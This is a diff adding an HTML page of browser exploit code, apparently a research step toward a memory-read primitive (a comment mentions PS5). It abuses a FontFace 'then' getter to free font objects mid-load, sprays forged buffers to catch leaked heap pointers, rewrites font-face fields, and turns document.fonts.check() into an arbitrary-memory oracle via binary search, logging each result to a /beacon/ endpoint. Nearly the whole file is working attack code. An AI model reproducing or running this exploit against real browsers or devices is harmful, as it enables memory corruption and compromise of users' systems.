@@ -1,0 +1,188 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p691c</title></head>
+<body><pre id="out">p691c: oracle diagnostic — test status values + range setups</pre>
+<script>
+'use strict';
+/*
+  p691c: Debug the fonts.check() oracle
+  -- prior art: p691 run2 oracle DEAD (chk returns false for all codepoints)
+  -- Hypothesis: status byte at +0x82 must be nonzero for check() to work
+  -- Test: try status 0,1,2,3,4 and see which gives a working oracle
+  -- Also: try pointing ranges at the buffer itself (offset +0x04 has known marker)
+
+  CRASH_CLASS: MODERATE
+*/
+
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,d){
+  var msg='P691C-'+tag+(d!==undefined?'-'+String(d).slice(0,400):'');
+  say(msg);
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/P691C-'+encodeURIComponent(tag+(d!==undefined?'-'+String(d).slice(0,400):''))+'?t='+Date.now(),false);x.send(null);}catch(e){
+    try{new Image().src='/beacon/P691C-'+encodeURIComponent(msg.slice(0,200))+'?t='+Date.now();}catch(e2){}}
+}
+
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
+function hex(x){return '0x'+x.toString(16);}
+
+bk('START',navigator.userAgent);
+
+var SIZE=192, K=256, fired=false, faces=null;
+
+function start(){
+  var vf;
+  try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){bk('NOVF');return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}
+    try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SIZE));
+      w[0x82]=3; // status = loaded
+      w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em vf, v1','AB').then(function(f){
+    faces=f;bk('RES','n'+f.length);setTimeout(phase,100);
+  },function(e){bk('RJ',String(e&&e.name));});
+}
+
+function phase(){
+  var bufs=[], L1=0n, L2=0n, hitIdx=-1;
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58), c=le(window.__sp[i],0x68);
+    if(a>0x1000000000n){bufs.push(window.__sp[i]);if(L1===0n){L1=a;L2=c;hitIdx=i;}}
+  }
+  bk('L1',hex(L1));bk('L2',hex(L2));bk('HITS',bufs.length);
+  if(!bufs.length){bk('NOLEAK');return;}
+
+  /* Step 2: Forge + find face (keep status=3 initially) */
+  for(var ib=0;ib<bufs.length;ib++){
+    bufs[ib][0]=2; put64(bufs[ib],0x08,L2); bufs[ib][0x10]=0;
+    // DON'T reset status — keep at 3 (loaded)
+    bufs[ib][0x28]=1; bufs[ib][0x2C]=1; // ranges count=1, cap=1
+  }
+
+  for(var i3=0;i3<faces.length;i3++){try{faces[i3].family='zz'+i3;}catch(e){}}
+  setTimeout(function(){
+    for(var i4=0;i4<faces.length;i4++){try{document.fonts.add(faces[i4]);}catch(e){}}
+    setTimeout(function(){
+      var fam=null,zi=-1;
+      for(var q=0;q<faces.length;q++){
+        try{if(document.fonts.check('1em zz'+q,'A')===false){fam='zz'+q;zi=q;break;}}catch(e){}
+      }
+      bk('FACE',fam+',zi='+zi);
+      if(zi<0){bk('NOFACE');return;}
+
+      function setR(t){for(var ir=0;ir<bufs.length;ir++){put64(bufs[ir],0x20,t);}}
+      function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c));}catch(e){return 'ERR';}}
+
+      /* Test 1: Raw check with L2+7 (the original approach) */
+      setR(L2+0x07n);
+      var t1_0=chk(0), t1_41=chk(0x41), t1_100=chk(0x100), t1_1000=chk(0x1000);
+      bk('T1-L2+7', 'chk0='+t1_0+' chk41='+t1_41+' chk100='+t1_100+' chk1000='+t1_1000);
+
+      /* Test 2: Try different status values */
+      var statuses = [0, 1, 2, 3, 4, 5];
+      for(var si=0; si<statuses.length; si++){
+        for(var ib2=0;ib2<bufs.length;ib2++) bufs[ib2][0x82]=statuses[si];
+        setR(L2+0x07n);
+        var s0=chk(0), s41=chk(0x41);
+        bk('STATUS-'+statuses[si], 'chk0='+s0+' chk41='+s41);
+      }
+      // Restore status=3
+      for(var ib3=0;ib3<bufs.length;ib3++) bufs[ib3][0x82]=3;
+
+      /* Test 3: Point ranges at known locations with small values */
+      // Create a controlled range in the buffer at offset +0xA0
+      // from=0x0020, to=0x007F (ASCII range)
+      for(var ib4=0;ib4<bufs.length;ib4++){
+        put32(bufs[ib4],0xA0,0x0020); // from
+        put32(bufs[ib4],0xA4,0x007F); // to
+      }
+      // But we don't know SELF to point at +0xA0...
+      // Instead, try L1 (hash table might have small values in metadata prefix)
+      setR(L1-0x10n); // metadata prefix: deletedCount, keyCount, tableSizeMask, tableSize
+      var m0=chk(0), m7=chk(7), m8=chk(8), m15=chk(15), m255=chk(255);
+      bk('T3-L1META', 'chk0='+m0+' chk7='+m7+' chk8='+m8+' chk15='+m15+' chk255='+m255);
+
+      // Try L1-0x10 + 4 (skip deletedCount, read keyCount as from)
+      setR(L1-0x0Cn); // points to: keyCount(4B), tableSizeMask(4B)
+      var k0=chk(0), k1=chk(1), k7=chk(7), k8=chk(8);
+      bk('T3-L1KC', 'chk0='+k0+' chk1='+k1+' chk7='+k7+' chk8='+k8);
+
+      // Try L1-8 (tableSizeMask as from, tableSize as to)
+      setR(L1-0x08n);
+      var ts0=chk(0), ts7=chk(7), ts8=chk(8), ts100=chk(0x100);
+      bk('T3-L1TSM', 'chk0='+ts0+' chk7='+ts7+' chk8='+ts8+' chk100='+ts100);
+
+      /* Test 4: Try with inverted check logic */
+      // Maybe PS5 check() returns true for codepoints IN range (not false)
+      setR(L2+0x07n);
+      bk('T4-RAW', 'exact check(0)='+String(document.fonts.check('1em '+fam,'\u0000'))+
+                    ' check(A)='+String(document.fonts.check('1em '+fam,'A'))+
+                    ' check(Z)='+String(document.fonts.check('1em '+fam,'Z')));
+
+      /* Test 5: What does check return for the face WITHOUT range manipulation? */
+      // Set ranges count to 0 (no range restriction)
+      for(var ib5=0;ib5<bufs.length;ib5++){bufs[ib5][0x28]=0;bufs[ib5][0x2C]=0;}
+      var nr0=chk(0), nrA=chk(0x41);
+      bk('T5-NORANGE', 'chk0='+nr0+' chkA='+nrA);
+      // Restore
+      for(var ib6=0;ib6<bufs.length;ib6++){bufs[ib6][0x28]=1;bufs[ib6][0x2C]=1;}
+
+      /* Test 6: Use boundary() with L1 metadata addresses */
+      function boundary(tgt){
+        setR(tgt);
+        var c0=chk(0);
+        if(c0!==false)return {b:-1, c0:c0};
+        var lo=0,hi=0x10FFFF,res=-1;
+        while(lo<=hi){var mid=(lo+hi)>>1;var r=chk(mid);if(r===null||r==='ERR')break;if(r===false){res=mid;lo=mid+1;}else hi=mid-1;}
+        return {b:res, c0:c0};
+      }
+
+      var b1=boundary(L2+0x07n);
+      bk('B-L2+7', 'b='+b1.b+' c0='+b1.c0);
+
+      var b2=boundary(L1-0x10n);
+      bk('B-L1META', 'b='+b2.b+' c0='+b2.c0);
+
+      var b3=boundary(L1-0x0Cn);
+      bk('B-L1KC', 'b='+b3.b+' c0='+b3.c0);
+
+      var b4=boundary(L1-0x08n);
+      bk('B-L1TSM', 'b='+b4.b+' c0='+b4.c0);
+
+      var b5=boundary(L1-0x04n);
+      bk('B-L1TS', 'b='+b5.b+' c0='+b5.c0);
+
+      var b6=boundary(L1);
+      bk('B-L1', 'b='+b6.b+' c0='+b6.c0);
+
+      /* Test 7: Check with explicit known-good range */
+      // Write range [0x0041, 0x005A] at buffer +0xA0, use buffer marker at +4 to find self
+      bk('T7', 'L1-low-hex='+hex(L1&0xFFFFn)+' L2-low-hex='+hex(L2&0xFFFFn));
+
+      bk('DONE','diagnostic complete');
+    },60);
+  },60);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')
+  setTimeout(start,0);
+else
+  document.addEventListener('DOMContentLoaded',function(){setTimeout(start,0);});
+</script></body></html>
